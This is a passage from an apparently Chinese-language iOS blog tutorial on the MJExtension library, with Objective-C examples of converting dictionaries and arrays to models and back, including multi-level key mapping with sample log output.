*status in result.statuses) &#123; NSString *text = status.text; NSString *name = status.user.name; NSString *icon = status.user.icon; NSLog(@&quot;mj---text=%@, name=%@, icon=%@&quot;, text, name, icon);&#125;//打印广告for (Ad *ad in result.ads) &#123; NSLog(@&quot;mj---image=%@, url=%@&quot;, ad.image, ad.url);&#125;//打印结果//2016-07-04 13:47:58.994 PPDemos[3353:113055] mj---text=Nice weather!, name=Rose, icon=nami.png//2016-07-04 13:47:58.995 PPDemos[3353:113055] mj---text=Go camping tomorrow!, name=Jack, icon=lufy.png//2016-07-04 13:47:58.995 PPDemos[3353:113055] mj---image=ad01.png, url=http://www.ad01.com//2016-07-04 13:47:58.995 PPDemos[3353:113055] mj---image=ad02.png, url=http://www.ad02.com 5、模型中的属性名和字典中的key不相同(或者需要多级映射)核心代码： mj_objectWithKeyValues:和mj_replacedKeyFromPropertyName： 多级映射，用点语法设置1234@interface Bag : NSObject @property (copy, nonatomic) NSString *name; @property (assign, nonatomic) double price;@end 12345678910import &lt;Foundation/Foundation.h&gt;@class Bag;@interface Student : NSObject @property (copy, nonatomic) NSString *ID; @property (copy, nonatomic) NSString *desc; @property (copy, nonatomic) NSString *nowName; @property (copy, nonatomic) NSString *oldName; @property (copy, nonatomic) NSString *nameChangedTime; @property (strong, nonatomic) Bag *bag;@end 1234567891011121314@implementation Student+(NSDictionary *)mj_replacedKeyFromPropertyName&#123;// 实现这个方法的目的：告诉MJExtension框架模型中的属性名对应着字典的哪个key return @&#123; @&quot;ID&quot; : @&quot;id&quot;, @&quot;desc&quot; : @&quot;desciption&quot;, @&quot;oldName&quot; : @&quot;name.oldName&quot;, @&quot;nowName&quot; : @&quot;name.newName&quot;, @&quot;nameChangedTime&quot; : @&quot;name.info[1].nameChangedTime&quot;, @&quot;bag&quot; : @&quot;other.bag&quot; &#125;;&#125;@end 12345678910111213141516171819202122NSDictionry *dict_nokey = @&#123; @&quot;id&quot; : @&quot;20&quot;, @&quot;desciption&quot; : @&quot;kids&quot;, @&quot;name&quot; : @&#123; @&quot;newName&quot; : @&quot;lufy&quot;, @&quot;oldName&quot; : @&quot;kitty&quot;, @&quot;info&quot; : @[ @&quot;test-data&quot;, @&#123; @&quot;nameChangedTime&quot; : @&quot;2013-08&quot; &#125; ] &#125;, @&quot;other&quot; : @&#123; @&quot;bag&quot; : @&#123; @&quot;name&quot; : @&quot;a red bag&quot;, @&quot;price&quot; : @100.7 &#125; &#125;&#125;; 123456789101112131415161718192021//// // How to map// [Student mj_setupReplacedKeyFromPropertyName:^NSDictionary *&#123; // return @&#123; // @&quot;ID&quot; : @&quot;id&quot;, // @&quot;desc&quot; : @&quot;desciption&quot;, // @&quot;oldName&quot; : @&quot;name.oldName&quot;, // @&quot;nowName&quot; : @&quot;name.newName&quot;, // @&quot;nameChangedTime&quot; : @&quot;name.info[1].nameChangedTime&quot;, // @&quot;bag&quot; : @&quot;other.bag&quot; // &#125;;// &#125;];// // Equals: Student.m implements +mj_replacedKeyFromPropertyName method.//字典转模型，支持多级映射Student *stu = [Student mj_objectWithKeyValues:dict_nokey];//打印NSLog(@&quot;ID=%@, desc=%@, oldName=%@, nowName=%@, nameChangedTime=%@&quot;,stu.ID, stu.desc, stu.oldName, stu.nowName, stu.nameChangedTime);NSLog(@&quot;bagName=%@, bagPrice=%f&quot;, stu.bag.name, stu.bag.price);//2016-07-04 14:20:28.082 PPDemos[3602:126004] ID=20, desc=kids, oldName=kitty, nowName=lufy, nameChangedTime=2013-08//2016-07-04 14:20:28.082 PPDemos[3602:126004] bagName=a red bag, bagPrice=100.700000 6.将一个字典数组转成模型数组 核心代码mj_objectArrayWithKeyValuesArray: 123456789101112131415161718NSArray *dictArray = @[ @&#123; @&quot;name&quot; : @&quot;Jack&quot;, @&quot;icon&quot; : @&quot;lufy.png&quot; &#125;, @&#123; @&quot;name&quot; : @&quot;Rose&quot;, @&quot;icon&quot; : @&quot;nami.png&quot; &#125;];//字典数组转模型数组，使用的是mj_objectArrayWithKeyValuesArray:方法NSArray *userArray = [User mj_objectArrayWithKeyValuesArray:dictArray];//打印for (User *user in userArray) &#123; NSLog(@&quot;name=%@, icon=%@&quot;, user.name, user.icon);&#125;// name=Jack, icon=lufy.png// name=Rose, icon=nami.png 7、 将一个模型转成字典核心代码mj_keyValues：12345678910111213141516171819User *user = [[User alloc] init];user.name = @&quot;Jack&quot;;user.icon = @&quot;lufy.png&quot;;//Status *status = [[Status alloc] init];status.user = user;status.text = @&quot;Nice mood!&quot;;////模型转字典，使用的是mj_keyValues属性NSDictionary *statusDict = status.mj_keyValues;NSLog(@&quot;%@&quot;, statusDict);/* &#123; text = &quot;Nice mood!&quot;; user = &#123; icon = &quot;lufy.png&quot;; name = Jack; &#125;; &#125; 8、将一个模型数组转成字典数组核心代码mj_keyValuesArrayWithObjectArray： 1234567891011121314151617181920212223242526//创建模型数组 User *user1 = [[User alloc] init]; user1.name = @&quot;Jack&quot;; user1.icon = @&quot;lufy.png&quot;; User *user2 = [[User alloc] init]; user2.name = @&quot;Rose&quot;; user2.icon = @&quot;nami.png&quot;; NSArray *userArray = @[user1, user2]; //模型数组转字典数组，使用的是mj_keyValuesArrayWithObjectArray:方法 NSArray *dictArray = [User mj_keyValuesArrayWithObjectArray:userArray]; NSLog(@&quot;%@&quot;, dictArray); /* ( &#123; icon = &quot;lufy.png&quot;; name = Jack; &#125;, &#123; icon = &quot;nami.png&quot;; name = Rose; &#125; ) */ 更多用法 参考NSObject+MJKeyValue.h 参考NSObject+MJCoding.h]]></content>
      <categories>
        <category>ios</category>
      </categories>
      <tags>
        <tag>ios</tag>
      </tags>
  </entry>
</search>
